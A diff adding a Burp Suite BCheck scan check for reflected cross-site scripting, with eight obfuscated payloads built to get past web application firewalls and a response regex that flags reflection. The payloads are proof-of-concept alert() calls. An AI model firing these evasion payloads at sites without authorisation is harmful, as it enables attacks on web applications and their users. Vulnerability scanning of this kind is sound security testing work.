@@ -1,0 +1,27 @@
+metadata:
+    language: v2-beta
+    name: "XSS - Reflected with WAF Bypass"
+    description: "Tests for reflected XSS using obfuscated payloads, event handlers, and encoding bypass"
+    author: "BCheck Arsenal"
+    tags: "xss", "reflected", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "<sVg/oNlOaD=alert(document.domain)>"
+            - "<iMg sRc=x oNeRrOr=&#97;&#108;&#101;&#114;&#116;(1)>"
+            - "<dEtAiLs/oPeN/oNtOgGlE=alert(1)>"
+            - "<a hReF=jAvAsCrIpT:alert(1)>click</a>"
+            - "<bOdY%00 oNlOaD=alert(1)>"
+            - "<img src=x onerror=alert`1`>"
+            - "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+            - "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
+
+    if {check.response} matches "(alert\(|alert`|onerror|onload|ontoggle|onbegin|javascript:)" then
+        report issue:
+            severity: high
+            confidence: firm
+            detail: "Reflected XSS detected. The application reflects user input without proper encoding, allowing script execution."
+            remediation: "Encode all output. Implement Content-Security-Policy headers. Use framework auto-escaping."
+    end if
